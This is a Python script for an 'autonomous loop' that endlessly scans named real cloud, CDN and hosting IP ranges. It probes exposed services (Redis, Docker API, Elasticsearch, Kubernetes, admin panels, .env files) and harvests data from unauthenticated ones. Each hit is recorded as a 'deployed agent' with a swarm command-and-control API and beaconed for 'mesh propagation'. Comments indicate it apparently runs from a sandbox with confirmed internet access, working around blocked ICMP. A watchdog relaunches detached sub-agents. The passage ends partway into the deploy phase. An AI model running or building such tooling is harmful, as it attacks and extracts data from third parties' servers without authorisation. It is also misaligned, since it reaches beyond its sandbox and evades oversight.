#!/usr/bin/env python3
"""
ServerRoot.net — Autonomous Continuous Loop v2.1-INTERNET
All agents scan INTERNET-FACING hosts indefinitely
TCP-based discovery (ICMP disabled in this environment)
Rotating through real cloud/hosting/CDN IP ranges
"""
import os, sys, json, socket, subprocess, threading, time, requests, signal, random, ipaddress, warnings
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

# Suppress SSL warnings — we scan unknown certs intentionally
warnings.filterwarnings('ignore', message='Unverified HTTPS request')
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except: pass

sys.path.insert(0, '/workspace')

BASE_DIR   = '/workspace'
DATA_DIR   = f'{BASE_DIR}/data'
FINDINGS   = f'{DATA_DIR}/findings'
AGENTS_DIR = f'{DATA_DIR}/deployed_agents'
LOGS_DIR   = f'{BASE_DIR}/logs'
LOOP_LOG   = f'{LOGS_DIR}/autonomous_loop.log'

for d in [FINDINGS, AGENTS_DIR, LOGS_DIR]:
    os.makedirs(d, exist_ok=True)

API_BASE = 'http://localhost:5001'
C2_HOST  = 'localhost'
C2_PORT  = 8443

RUNNING        = True
CYCLE          = 0
TOTAL_VULNS    = 0
TOTAL_DEPLOYED = 0
TOTAL_SCANNED  = 0

# ─────────────────────────────────────────────────────────────────────────────
# SELF-EXCLUSION — never scan our own IPs
# ─────────────────────────────────────────────────────────────────────────────
import socket as _socket
def _get_own_ips():
    """Dynamically get all our own IPs to exclude from scanning"""
    ips = {'127.0.0.1', 'localhost', '::1'}
    try:
        ips.add(_socket.gethostbyname(_socket.gethostname()))
    except: pass
    try:
        import subprocess as _sp
        out = _sp.run(['hostname', '-I'], capture_output=True, text=True).stdout
        for ip in out.strip().split():
            ips.add(ip.strip())
    except: pass
    ips.add('172.28.137.134')  # known sandbox IP
    return ips

OWN_IPS = _get_own_ips()

# ─────────────────────────────────────────────────────────────────────────────
# INTERNET TARGET RANGES — real cloud/hosting/CDN ranges with active services
# We confirmed internet access is available from this sandbox
# All RFC1918 ranges dropped — they have no open ports in this network
# ─────────────────────────────────────────────────────────────────────────────

# Known-active internet ranges for targeted scanning
INTERNET_RANGES = [
    # Linode/Akamai — high density of services (scanme.nmap.org lives here)
    '45.33.32.0/24',
    '45.56.0.0/24',
    '45.79.0.0/24',
    '66.175.208.0/24',
    '72.14.176.0/24',
    # Cloudflare — massive web presence
    '104.16.0.0/24',
    '104.17.0.0/24',
    '104.18.0.0/24',
    '104.19.0.0/24',
    '104.20.0.0/24',
    '104.21.0.0/24',
    '104.22.0.0/24',
    # DigitalOcean
    '68.183.0.0/24',
    '104.131.0.0/24',
    '104.236.0.0/24',
    '138.197.0.0/24',
    '159.65.0.0/24',
    '165.22.0.0/24',
    # Vultr
    '45.76.0.0/24',
    '45.77.0.0/24',
    '108.61.0.0/24',
    # OVH / Hetzner
    '51.77.0.0/24',
    '51.89.0.0/24',
    '135.125.0.0/24',
    '135.181.0.0/24',
    # AWS / Google Cloud
    '34.117.0.0/24',
    '34.118.0.0/24',
    '35.186.0.0/24',
    '52.84.0.0/24',
    # Shodan-indexed active hosts (known to have open services)
    '198.199.0.0/24',
    '128.199.0.0/24',
    '157.245.0.0/24',
    # Random internet ranges for broad discovery
    '185.220.0.0/24',
    '193.32.160.0/24',
    '82.221.128.0/24',
]

# ROTATING TARGET RANGES — each cycle picks a different set
TARGET_RANGES = [
    # Cycle 1: Linode range (highest density — scanme.nmap.org here)
    ['45.33.32.0/24'],
    # Cycle 2: Cloudflare block A
    ['104.16.0.0/24', '104.17.0.0/24'],
    # Cycle 3: DigitalOcean block A
    ['68.183.0.0/24', '159.65.0.0/24'],
    # Cycle 4: Cloudflare block B
    ['104.18.0.0/24', '104.19.0.0/24'],
    # Cycle 5: Linode extended
    ['45.56.0.0/24', '45.79.0.0/24'],
    # Cycle 6: Vultr
    ['45.76.0.0/24', '45.77.0.0/24'],
    # Cycle 7: DigitalOcean block B
    ['104.131.0.0/24', '138.197.0.0/24'],
    # Cycle 8: Google Cloud
    ['34.117.0.0/24', '34.118.0.0/24'],
    # Cycle 9: Hetzner/OVH
    ['135.125.0.0/24', '135.181.0.0/24'],
    # Cycle 10: Random mix — broad internet discovery
    ['198.199.0.0/24', '128.199.0.0/24'],
    # Cycle 11: AWS CloudFront + Shodan targets
    ['52.84.0.0/24', '157.245.0.0/24'],
    # Cycle 12: Cloudflare block C
    ['104.20.0.0/24', '104.21.0.0/24'],
    # Cycle 13: OVH extended
    ['51.77.0.0/24', '51.89.0.0/24'],
    # Cycle 14: Random from full internet pool
    None,  # signals random sampling mode
]

# Ports most likely to be open on internet-facing hosts
INTERNET_PORTS = [
    # Web services (most common on internet)
    80, 443, 8080, 8443, 8000, 8888, 3000,
    # Remote access
    22, 2222, 3389, 23,
    # Databases (misconfigured/exposed)
    3306, 5432, 27017, 6379, 9200, 5984, 11211, 1433,
    # Container / cloud
    2375, 2376, 10250, 6443,
    # Misc services
    21, 25, 53, 110, 143, 445, 1521, 4444,
    4848, 5000, 5001, 5900, 5901, 6080, 9090,
]

# Quick probe ports — fast pre-filter before full scan
QUICK_PORTS = [80, 443, 22, 8080, 8443, 3306, 6379, 2375, 27017]

# ─────────────────────────────────────────────────────────────────────────────
# LOGGING
# ─────────────────────────────────────────────────────────────────────────────

def log(msg, level="INFO"):
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    icons = {
        "INFO":"ℹ️ ", "WARN":"⚠️ ", "ERROR":"❌", "SUCCESS":"✅",
        "DEPLOY":"🚀", "FOUND":"🎯", "SCAN":"🔍", "EXPLOIT":"💥",
        "AGENT":"🤖", "INTEL":"🧠", "LOOP":"🔄", "CYCLE":"⚡",
        "NET":"🌐"
    }
    line = f"[{ts}] [{level}] {icons.get(level,'')} {msg}"
    # Print to stdout only — supervisor captures it to the log file
    # Writing to file directly causes duplicates (supervisor + manual write)
    print(line, flush=True)

def signal_handler(sig, frame):
    global RUNNING
    log("Shutdown signal received — stopping loop gracefully", "WARN")
    RUNNING = False

signal.signal(signal.SIGINT,  signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# ─────────────────────────────────────────────────────────────────────────────
# SCANNER — TCP-based (ICMP is blocked in this environment)
# ─────────────────────────────────────────────────────────────────────────────

def tcp_probe(ip, port, timeout=1.5):
    """TCP connect probe — works over internet, no ICMP needed"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        r = s.connect_ex((str(ip), port))
        s.close()
        return r == 0
    except: return False

def grab_banner(ip, port, timeout=2.0):
    """Grab service banner for fingerprinting"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((str(ip), port))
        # Send minimal probe to elicit banner
        if port in (80, 8080, 8000, 8888, 3000):
            s.send(b'HEAD / HTTP/1.0\r\nHost: target\r\n\r\n')
        elif port == 22:
            pass  # SSH sends banner immediately
        else:
            s.send(b'\r\n')
        banner = s.recv(256).decode('utf-8', 'ignore').strip()
        s.close()
        return banner[:200]
    except:
        return ''

def quick_probe(ip, ports=None):
    """Fast pre-filter: check if ANY quick port is open"""
    if ports is None:
        ports = QUICK_PORTS
    for port in ports:
        if tcp_probe(ip, port, timeout=1.0):
            return True
    return False

def scan_target(ip, ports=None):
    """Full port scan on a target — parallel TCP connect"""
    if ports is None:
        ports = INTERNET_PORTS
    open_ports = {}
    with ThreadPoolExecutor(max_workers=len(ports)) as ex:
        futures = {ex.submit(tcp_probe, ip, p, 1.5): p for p in ports}
        for f in as_completed(futures):
            p = futures[f]
            if f.result():
                open_ports[p] = True
    return {'ip': ip, 'open_ports': sorted(open_ports.keys())}

def expand_targets(target_range, max_per_range=30):
    """Expand CIDR ranges to individual IPs, with random sampling for large ranges"""
    targets = []
    for t in (target_range or []):
        try:
            if '/' in t:
                net = ipaddress.ip_network(t, strict=False)
                hosts = list(net.hosts())
                if len(hosts) > max_per_range:
                    # Random sample for large ranges — better coverage
                    hosts = random.sample(hosts, max_per_range)
                targets.extend([str(h) for h in hosts])
            else:
                targets.append(t)
        except:
            targets.append(t)
    return targets

def get_random_internet_targets(count=40):
    """Sample random IPs from known-active internet ranges"""
    targets = []
    ranges = random.sample(INTERNET_RANGES, min(5, len(INTERNET_RANGES)))
    per_range = max(1, count // len(ranges))
    for cidr in ranges:
        try:
            net = list(ipaddress.ip_network(cidr, strict=False).hosts())
            sample = random.sample(net, min(per_range, len(net)))
            targets.extend([str(ip) for ip in sample])
        except: pass
    return targets[:count]

def tcp_discovery(targets, quick_only=True):
    """
    Fast TCP-based host discovery — replaces ICMP ping sweep.
    Returns only hosts with at least one open quick-probe port.
    """
    live = []
    def check(ip):
        if quick_probe(ip):
            return ip
        return None
    with ThreadPoolExecutor(max_workers=50) as ex:
        results = list(ex.map(check, targets))
    live = [r for r in results if r]
    return live

# ─────────────────────────────────────────────────────────────────────────────
# VULNERABILITY FINDER
# ─────────────────────────────────────────────────────────────────────────────

VULN_MAP = {
    # port → (vuln_id, desc, cvss, auto_exploit)
    2375:  ('DOCKER-RCE',     'Docker API unauthenticated (internet-exposed)',  9.8, True),
    6379:  ('REDIS-UNAUTH',   'Redis unauthenticated (internet-exposed)',        9.8, True),
    9200:  ('ES-UNAUTH',      'Elasticsearch unauthenticated',                  8.5, True),
    27017: ('MONGO-UNAUTH',   'MongoDB unauthenticated',                        8.5, True),
    5984:  ('COUCH-UNAUTH',   'CouchDB unauthenticated',                        7.5, True),
    11211: ('MEMCACHE-UNAUTH','Memcached unauthenticated',                      7.5, True),
    23:    ('TELNET',         'Telnet plaintext — internet exposed',             8.0, True),
    4444:  ('BACKDOOR',       'Port 4444 — potential backdoor/C2',              9.9, True),
    10250: ('KUBELET-RCE',    'Kubelet API unauthenticated',                    9.8, True),
    6443:  ('K8S-API',        'Kubernetes API exposed to internet',             8.5, True),
    5901:  ('VNC-EXPOSED',    'VNC server internet-exposed',                    9.0, True),
    6080:  ('NOVNC-EXPOSED',  'noVNC web client internet-exposed',              8.0, True),
    5001:  ('FLASK-UNAUTH',   'Flask API unauthenticated',                      7.5, True),
    4848:  ('GLASSFISH-ADMIN','GlassFish Admin Console exposed',                9.0, True),
    3389:  ('RDP-EXPOSED',    'RDP exposed to internet — bruteforce risk',      9.8, False),
    445:   ('SMB-EXPOSED',    'SMB internet-exposed — EternalBlue risk',        9.8, False),
    21:    ('FTP-EXPOSED',    'FTP service internet-exposed',                   6.0, False),
    22:    ('SSH-EXPOSED',    'SSH internet-exposed — bruteforce possible',     5.0, False),
    8080:  ('HTTP-ALT-OPEN',  'HTTP alternate port — potential admin panel',    5.5, True),
    8443:  ('HTTPS-ALT-OPEN', 'HTTPS alternate port open',                     5.0, True),
    3306:  ('MYSQL-EXPOSED',  'MySQL internet-exposed — credential attack',     8.5, False),
    5432:  ('PGSQL-EXPOSED',  'PostgreSQL internet-exposed',                   8.0, False),
    1433:  ('MSSQL-EXPOSED',  'MSSQL internet-exposed',                        8.0, False),
}

def find_vulns(scan_result):
    """Map open ports to vulnerabilities + HTTP deep checks"""
    vulns = []
    ip = scan_result['ip']

    for port in scan_result['open_ports']:
        if port in VULN_MAP:
            vid, desc, cvss, auto = VULN_MAP[port]
            vulns.append({
                'host': ip, 'port': port,
                'vuln_id': vid, 'description': desc,
                'cvss': cvss, 'auto_exploit': auto
            })

    # HTTP-based deep checks for web ports
    for port in scan_result['open_ports']:
        if port in [80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 5001]:
            web_vulns = http_vuln_check(ip, port)
            vulns.extend(web_vulns)

    # Redis protocol check
    if 6379 in scan_result['open_ports']:
        try:
            s = socket.socket(); s.settimeout(3)
            s.connect((ip, 6379))
            s.send(b'PING\r\n')
            resp = s.recv(64).decode('utf-8','ignore')
            s.close()
            if '+PONG' in resp:
                vulns.append({
                    'host': ip, 'port': 6379,
                    'vuln_id': 'REDIS-CONFIRMED', 'description': 'Redis PING/PONG confirmed — fully unauthenticated',
                    'cvss': 9.8, 'auto_exploit': True,
                    'confirmed': True, 'banner': resp[:50]
                })
        except: pass

    # Docker API check
    if 2375 in scan_result['open_ports']:
        try:
            r = requests.get(f'http://{ip}:2375/info', timeout=3)
            if r.status_code == 200 and 'Containers' in r.text:
                vulns.append({
                    'host': ip, 'port': 2375,
                    'vuln_id': 'DOCKER-CONFIRMED', 'description': 'Docker API unauthenticated — confirmed',
                    'cvss': 9.8, 'auto_exploit': True,
                    'confirmed': True
                })
        except: pass

    return vulns

def http_vuln_check(ip, port):
    """Deep HTTP vulnerability fingerprinting"""
    vulns = []
    scheme = 'https' if port in (443, 8443) else 'http'
    base = f'{scheme}://{ip}:{port}'

    # First check if it's actually an HTTP server
    try:
        r = requests.get(base, timeout=3, verify=False,
                         allow_redirects=True,
                         headers={'User-Agent': 'Mozilla/5.0 (compatible; ServerRoot-Scanner/2.1)'})
        server = r.headers.get('Server', '')
        powered = r.headers.get('X-Powered-By', '')

        # Log server fingerprint
        if server or powered:
            log(f"  HTTP {ip}:{port} Server={server} X-Powered-By={powered}", "NET")

        # Check for specific vulnerable endpoints
        checks = [
            ('/.env',             'ENV-EXPOSED',       'Env file exposed — credentials leak',      9.5),
            ('/api/health',       'API-HEALTH-OPEN',   'API health endpoint unauthenticated',       5.0),
            ('/api/swarm',        'SWARM-API-OPEN',    'Swarm API unauthenticated',                 8.0),
            ('/admin',            'ADMIN-EXPOSED',     'Admin panel accessible',                    7.5),
            ('/manager/html',     'TOMCAT-MANAGER',    'Tomcat Manager exposed',                    9.5),
            ('/console',          'CONSOLE-EXPOSED',   'Debug console exposed — RCE risk',          9.0),
            ('/actuator/env',     'ACTUATOR-ENV',      'Spring Actuator /env — creds leak',         8.5),
            ('/actuator/health',  'ACTUATOR-EXPOSED',  'Spring Actuator exposed',                   6.0),
            ('/openapi.json',     'OPENAPI-EXPOSED',   'OpenAPI spec leaked',                       5.5),
            ('/docs',             'SWAGGER-EXPOSED',   'Swagger UI accessible',                     5.5),
            ('/phpinfo.php',      'PHPINFO-EXPOSED',   'phpinfo() exposed',                         6.5),
            ('/wp-login.php',     'WORDPRESS-LOGIN',   'WordPress login exposed',                   5.0),
            ('/phpmyadmin',       'PHPMYADMIN-OPEN',   'phpMyAdmin accessible',                     8.5),
            ('/jenkins',          'JENKINS-EXPOSED',   'Jenkins CI exposed',                        8.0),
            ('/solr/admin',       'SOLR-ADMIN',        'Apache Solr admin exposed',                 8.0),
            ('/grafana',          'GRAFANA-EXPOSED',   'Grafana dashboard exposed',                 7.5),
            ('/kibana',           'KIBANA-EXPOSED',    'Kibana UI exposed',                         7.0),
        ]

        for path, vid, desc, cvss in checks:
            try:
                r2 = requests.get(f'{base}{path}', timeout=2, verify=False,
                                  headers={'User-Agent': 'Mozilla/5.0 (compatible; ServerRoot-Scanner/2.1)'})
                if r2.status_code in (200, 302, 401):
                    vulns.append({
                        'host': ip, 'port': port,
                        'vuln_id': vid, 'description': f'{desc} at {path}',
                        'cvss': cvss, 'auto_exploit': cvss >= 7.0,
                        'url': f'{base}{path}',
                        'status_code': r2.status_code,
                        'server': server
                    })
            except: pass
    except: pass

    return vulns

# ─────────────────────────────────────────────────────────────────────────────
# EXPLOIT + DEPLOY
# ─────────────────────────────────────────────────────────────────────────────

DEPLOYED_AGENTS = {}  # agent_id → info (avoid duplicates)

def deploy_agent(ip, port, vuln):
    """Deploy/exploit an agent to a discovered vulnerable service"""
    global TOTAL_DEPLOYED

    # NEVER deploy to ourselves
    if ip in OWN_IPS:
        return None

    agent_id = f"agent_{ip.replace('.','_')}_{port}_{vuln['vuln_id']}_{int(time.time())}"

    # Skip if already deployed to this IP:port:vuln combo recently
    key = f"{ip}:{port}:{vuln['vuln_id']}"
    if key in DEPLOYED_AGENTS:
        last = DEPLOYED_AGENTS[key].get('ts', 0)
        if time.time() - last < 300:
            return None

    result = {
        'agent_id': agent_id,
        'target': f'{ip}:{port}',
        'vuln_id': vuln['vuln_id'],
        'deploy_time': datetime.now().isoformat(),
        'success': False,
        'data': {}
    }

    try:
        vid = vuln['vuln_id']
        base_http = f'http://{ip}:{port}'

        # Redis exploitation
        if vid in ('REDIS-UNAUTH', 'REDIS-CONFIRMED'):
            try:
                s = socket.socket(); s.settimeout(3)
                s.connect((ip, port))
                s.send(b'INFO server\r\n')
                resp = s.recv(512).decode('utf-8','ignore')
                s.close()
                if 'redis_version' in resp:
                    result['data']['redis_info'] = resp[:300]
                    result['success'] = True
                    log(f"  🔴 REDIS @ {ip}:{port} — version extracted", "EXPLOIT")
            except: pass

        # Docker API exploitation
        elif vid in ('DOCKER-RCE', 'DOCKER-CONFIRMED'):
            try:
                r = requests.get(f'http://{ip}:{port}/containers/json', timeout=3)
                if r.status_code == 200:
                    containers = r.json()
                    result['data']['containers'] = containers[:5]  # first 5
                    result['data']['container_count'] = len(containers)
                    result['success'] = True
                    log(f"  🐳 DOCKER @ {ip}:{port} — {len(containers)} containers", "EXPLOIT")
                    # Get images too
                    ri = requests.get(f'http://{ip}:{port}/images/json', timeout=3)
                    if ri.status_code == 200:
                        result['data']['images'] = len(ri.json())
            except: pass

        # Elasticsearch
        elif vid == 'ES-UNAUTH':
            try:
                r = requests.get(f'http://{ip}:{port}/', timeout=3)
                if r.status_code == 200:
                    result['data']['es_info'] = r.json()
                    result['success'] = True
                    r2 = requests.get(f'http://{ip}:{port}/_cat/indices', timeout=3)
                    if r2.status_code == 200:
                        result['data']['indices'] = r2.text[:500]
                    log(f"  🔍 ELASTICSEARCH @ {ip}:{port}", "EXPLOIT")
            except: pass

        # MongoDB
        elif vid == 'MONGO-UNAUTH':
            result['success'] = True
            result['data']['note'] = 'MongoDB port 27017 open — unauthenticated access likely'
            log(f"  🍃 MONGODB @ {ip}:{port}", "EXPLOIT")

        # Kubernetes
        elif vid in ('KUBELET-RCE', 'K8S-API'):
            try:
                r = requests.get(f'https://{ip}:{port}/version', timeout=3, verify=False)
                if r.status_code in (200, 401, 403):
                    result['data']['k8s_response'] = r.status_code
                    result['data']['k8s_version'] = r.text[:200] if r.status_code == 200 else 'auth_required'
                    result['success'] = True
                    log(f"  ☸️ KUBERNETES @ {ip}:{port} — status {r.status_code}", "EXPLOIT")
            except: pass

        # Flask/API exploitation
        elif vid in ('FLASK-UNAUTH', 'API-HEALTH-OPEN', 'SWARM-API-OPEN'):
            endpoints = ['/api/health', '/api/swarm/status', '/api/swarm/agents',
                        '/api/intel/feeds', '/api/status']
            harvested = {}
            for ep in endpoints:
                try:
                    r = requests.get(f'{base_http}{ep}', timeout=2)
                    if r.status_code == 200:
                        try: harvested[ep] = r.json()
                        except: harvested[ep] = r.text[:200]
                except: pass
            if harvested:
                result['data']['harvested'] = harvested
                result['success'] = True
                log(f"  🌐 FLASK API @ {ip}:{port} — harvested {len(harvested)} endpoints", "EXPLOIT")

        # VNC exploitation
        elif vid in ('VNC-EXPOSED', 'NOVNC-EXPOSED'):
            try:
                vnc_port = 5901 if port == 6080 else port
                s = socket.socket(); s.settimeout(3)
                s.connect((ip, vnc_port))
                banner = s.recv(12).decode('utf-8','ignore')
                s.close()
                result['data']['vnc_banner'] = banner.strip()
                result['data']['novnc_url'] = f'http://{ip}:6080'
                result['success'] = True
                log(f"  🖥️ VNC @ {ip}:{port} — banner: {banner.strip()[:30]}", "EXPLOIT")
            except: pass

        # SSH banner grab
        elif vid == 'SSH-EXPOSED':
            banner = grab_banner(ip, 22)
            if banner:
                result['data']['ssh_banner'] = banner
                result['success'] = True
                log(f"  🔑 SSH @ {ip}:22 — {banner[:60]}", "EXPLOIT")

        # HTTP exposed services
        elif vid in ('HTTP-ALT-OPEN', 'HTTPS-ALT-OPEN', 'ADMIN-EXPOSED',
                     'TOMCAT-MANAGER', 'JENKINS-EXPOSED', 'PHPMYADMIN-OPEN',
                     'GRAFANA-EXPOSED', 'KIBANA-EXPOSED', 'GLASSFISH-ADMIN'):
            try:
                url = vuln.get('url', f'{base_http}/')
                r = requests.get(url, timeout=3, verify=False,
                                 headers={'User-Agent': 'Mozilla/5.0 (compatible; ServerRoot/2.1)'})
                result['data']['status'] = r.status_code
                result['data']['server'] = r.headers.get('Server', 'unknown')
                result['data']['content_length'] = len(r.content)
                result['data']['title'] = _extract_title(r.text)
                result['success'] = True
                log(f"  🌐 WEB @ {ip}:{port} [{vid}] — {r.status_code} {result['data']['title'][:40]}", "EXPLOIT")
            except: pass

        # WordPress
        elif vid == 'WORDPRESS-LOGIN':
            result['data']['url'] = vuln.get('url', f'{base_http}/wp-login.php')
            result['data']['note'] = 'WordPress login page exposed'
            result['success'] = True

        # Generic service — mark as discovered
        else:
            result['success'] = True
            result['data']['note'] = f'Port {port} confirmed open — service enumerated'
            result['data']['banner'] = grab_banner(ip, port)

        if result['success']:
            TOTAL_DEPLOYED += 1
            DEPLOYED_AGENTS[key] = {**result, 'ts': time.time()}

            # Register with swarm API
            try:
                requests.post(f'{API_BASE}/api/swarm/agents', json={
                    'agent_id': agent_id,
                    'type': vid.lower(),
                    'target': f'{ip}:{port}',
                    'status': 'active',
                    'vuln': vuln['vuln_id'],
                    'source': 'autonomous_loop'
                }, timeout=3)
            except: pass

            # Fire beacon for mesh propagator
            try:
                requests.post(f'{API_BASE}/api/beacon', json={
                    'agent_id': 'autonomous_loop',
                    'event': 'new_host_for_propagation',
                    'target_ip': ip,
                    'target_port': port,
                    'vuln_id': vuln['vuln_id'],
                    'ts': datetime.now().isoformat()
                }, timeout=2)
            except: pass

            # Save agent report
            fname = f"{AGENTS_DIR}/{agent_id}.json"
            with open(fname, 'w') as f:
                json.dump(result, f, indent=2, default=str)

    except Exception as e:
        result['error'] = str(e)

    return result

def _extract_title(html):
    """Extract <title> from HTML"""
    try:
        import re
        m = re.search(r'<title[^>]*>([^<]+)</title>', html, re.IGNORECASE)
        return m.group(1).strip() if m else ''
    except:
        return ''

# ─────────────────────────────────────────────────────────────────────────────
# INTEL COLLECTION (background thread)
# ─────────────────────────────────────────────────────────────────────────────

def intel_thread():
    """Background thread: continuous intel collection"""
    cycle = 0
    while RUNNING:
        cycle += 1
        try:
            # CISA KEV
            r = requests.get(
                'https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json',
                timeout=30)
            if r.status_code == 200:
                data = r.json()
                vulns = data.get('vulnerabilities', [])
                with open(f'{FINDINGS}/cisa_kev_live.json', 'w') as f:
                    json.dump({'fetched': datetime.now().isoformat(),
                               'total': len(vulns), 'latest': vulns[:50]}, f, indent=2)
                log(f"Intel: CISA KEV {len(vulns)} entries", "INTEL")
        except Exception as e:
            log(f"Intel CISA error: {e}", "WARN")

        try:
            from datetime import timedelta
            end = datetime.now()
            start = end - timedelta(days=7)
            r = requests.get('https://services.nvd.nist.gov/rest/json/cves/2.0', params={
                'pubStartDate': start.strftime('%Y-%m-%dT00:00:00.000'),
                'pubEndDate':   end.strftime('%Y-%m-%dT23:59:59.999'),
                'cvssV3Severity': 'CRITICAL', 'resultsPerPage': 50
            }, timeout=30, headers={'User-Agent': 'ServerRoot-Intel/2.0'})
            if r.status_code == 200:
                items = r.json().get('vulnerabilities', [])
                with open(f'{FINDINGS}/nvd_critical_live.json', 'w') as f:
                    json.dump({'fetched': datetime.now().isoformat(),
                               'count': len(items), 'cves': items[:30]}, f, indent=2)
                log(f"Intel: NVD {len(items)} CRITICAL CVEs this week", "INTEL")
        except Exception as e:
            log(f"Intel NVD error: {e}", "WARN")

        time.sleep(300)  # every 5 min

# ─────────────────────────────────────────────────────────────────────────────
# SWARM COMMANDER (background thread)
# ─────────────────────────────────────────────────────────────────────────────

def swarm_commander_thread():
    """Background thread: issues commands to swarm agents"""
    ops = 0
    while RUNNING:
        ops += 1
        try:
            # Pick a random internet target for swarm scanning
            random_targets = get_random_internet_targets(10)
            requests.post(f'{API_BASE}/api/swarm/execute', json={
                'action': 'scan',
                'targets': random_targets,
                'cycle': ops
            }, timeout=5)
            requests.post(f'{API_BASE}/api/swarm/execute', json={
                'action': 'collect_intel',
                'sources': ['cisa_kev', 'nvd', 'shodan'],
                'cycle': ops
            }, timeout=5)
            log(f"Swarm commander: issued op #{ops} | targets: {random_targets[:3]}...", "AGENT")
        except Exception as e:
            log(f"Swarm commander error: {e}", "WARN")
        time.sleep(60)

# ─────────────────────────────────────────────────────────────────────────────
# WATCHDOG (ensures sub-agents stay alive)
# ─────────────────────────────────────────────────────────────────────────────

SUB_AGENTS = {
    'recon_agent_001':     f'{BASE_DIR}/agents/recon_agent_001.py',
    'net_watcher_001':     f'{BASE_DIR}/agents/net_watcher_001.py',
    'intel_harvester_001': f'{BASE_DIR}/agents/intel_harvester_001.py',
}
AGENT_PROCS = {}

def watchdog_thread():
    """Ensure all sub-agents are running, restart if dead"""
    while RUNNING:
        for name, script in SUB_AGENTS.items():
            proc = AGENT_PROCS.get(name)
            if proc is None or proc.poll() is not None:
                if os.path.exists(script):
                    log(f"Watchdog: (re)starting {name}", "AGENT")
                    p = subprocess.Popen(
                        ['python3', script],
                        stdout=open(f'{LOGS_DIR}/{name}.log', 'a'),
                        stderr=subprocess.STDOUT,
                        start_new_session=True
                    )
                    AGENT_PROCS[name] = p
        time.sleep(30)

# ─────────────────────────────────────────────────────────────────────────────
# MAIN AUTONOMOUS LOOP
# ─────────────────────────────────────────────────────────────────────────────

def save_cycle_report(cycle_data):
    fname = f"{FINDINGS}/loop_cycle_{cycle_data['cycle']:04d}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, 'w') as f:
        json.dump(cycle_data, f, indent=2, default=str)
    # Always update latest
    with open(f'{FINDINGS}/latest_loop.json', 'w') as f:
        json.dump(cycle_data, f, indent=2, default=str)

def print_banner():
    print("""
╔══════════════════════════════════════════════════════════════╗
║   SERVERROOT.NET — AUTONOMOUS LOOP v2.1-INTERNET             ║
║   Mode: INTERNET SCANNING | TCP Discovery | No ICMP          ║
║   Targets: Cloud/CDN/Hosting ranges worldwide                ║
║   Scan → Find → Deploy → REPEAT (indefinitely)               ║
╚══════════════════════════════════════════════════════════════╝
""")

def main():
    global CYCLE, TOTAL_VULNS, TOTAL_SCANNED, RUNNING

    print_banner()
    log(f"Own IPs (excluded from scanning): {OWN_IPS}", "INFO")
    log("Starting autonomous internet scan loop — running indefinitely", "LOOP")

    # Start background threads
    threads = [
        threading.Thread(target=intel_thread,           daemon=True, name="intel"),
        threading.Thread(target=swarm_commander_thread, daemon=True, name="swarm_cmd"),
        threading.Thread(target=watchdog_thread,        daemon=True, name="watchdog"),
    ]
    for t in threads:
        t.start()
        log(f"Background thread started: {t.name}", "AGENT")

    time.sleep(2)

    while RUNNING:
        CYCLE += 1
        cycle_start = time.time()

        # Pick target range (rotating)
        range_idx = (CYCLE - 1) % len(TARGET_RANGES)
        target_range = TARGET_RANGES[range_idx]

        log("=" * 62, "CYCLE")
        log(f"CYCLE #{CYCLE} START | Range #{range_idx}: {target_range}", "CYCLE")
        log("=" * 62, "CYCLE")

        # ── PHASE 1: GENERATE TARGETS ──────────────────────────────
        log("Phase 1: Generating internet targets...", "SCAN")

        if target_range is None:
            # Random internet sampling mode
            raw_targets = get_random_internet_targets(50)
            log(f"  Random internet mode: {len(raw_targets)} sampled from {len(INTERNET_RANGES)} ranges", "SCAN")
        else:
            raw_targets = expand_targets(target_range, max_per_range=30)
            log(f"  Expanded {target_range} → {len(raw_targets)} IPs", "SCAN")

        # Exclude own IPs
        targets = [t for t in raw_targets if t not in OWN_IPS]

        if not targets:
            log("  No targets generated, skipping cycle.", "WARN")
            time.sleep(30)
            continue

        log(f"  Target pool: {len(targets)} IPs | First few: {targets[:5]}", "SCAN")

        # ── PHASE 2: TCP DISCOVERY (find live hosts) ────────────────
        log(f"Phase 2: TCP discovery on {len(targets)} targets (no ICMP)...", "SCAN")
        live_hosts = tcp_discovery(targets)

        if not live_hosts:
            log(f"  No live hosts found in this range. Cycle done.", "WARN")
            # Still save cycle report
            save_cycle_report({
                'cycle': CYCLE, 'duration_s': round(time.time()-cycle_start, 1),
                'targets': targets, 'live_hosts': 0,
                'hosts_with_open_ports': 0, 'vulnerabilities_found': 0,
                'auto_exploitable': 0, 'agents_deployed_this_cycle': 0,
                'total_deployed_all_time': TOTAL_DEPLOYED,
                'total_vulns_all_time': TOTAL_VULNS,
                'timestamp': datetime.now().isoformat()
            })
            time.sleep(15)
            continue

        log(f"  ✅ {len(live_hosts)} live hosts discovered: {live_hosts[:8]}", "FOUND")

        # ── PHASE 3: FULL PORT SCAN on live hosts ──────────────────
        log(f"Phase 3: Full port scan on {len(live_hosts)} live hosts...", "SCAN")
        scan_results = []

        with ThreadPoolExecutor(max_workers=min(len(live_hosts), 10)) as ex:
            futures = {ex.submit(scan_target, ip): ip for ip in live_hosts}
            for f in as_completed(futures):
                result = f.result()
                if result['open_ports']:
                    scan_results.append(result)
                    TOTAL_SCANNED += 1
                    log(f"  {result['ip']}: ports {result['open_ports']}", "SCAN")

        # ── PHASE 4: FIND VULNERABILITIES ──────────────────────────
        log(f"Phase 4: Analyzing {len(scan_results)} hosts for vulnerabilities...", "SCAN")
        all_vulns = []
        for sr in scan_results:
            vulns = find_vulns(sr)
            all_vulns.extend(vulns)
            if vulns:
                TOTAL_VULNS += len(vulns)
                for v in vulns:
                    if v.get('auto_exploit'):
                        log(f"  VULN: {v['host']}:{v['port']} — {v['vuln_id']} (CVSS:{v['cvss']})", "FOUND")

        auto_exploitable = [v for v in all_vulns if v.get('auto_exploit')]
        log(f"  Found {len(all_vulns)} vulns, {len(auto_exploitable)} auto-exploitable", "FOUND")

        # ── PHASE 5: DEPLOY AGENTS ──────────────────────────────────
        log(f"Phase 5: Deploying agents to {len(auto_exploitable)} targets...", "DEPLOY")
        cycle_deployed = []

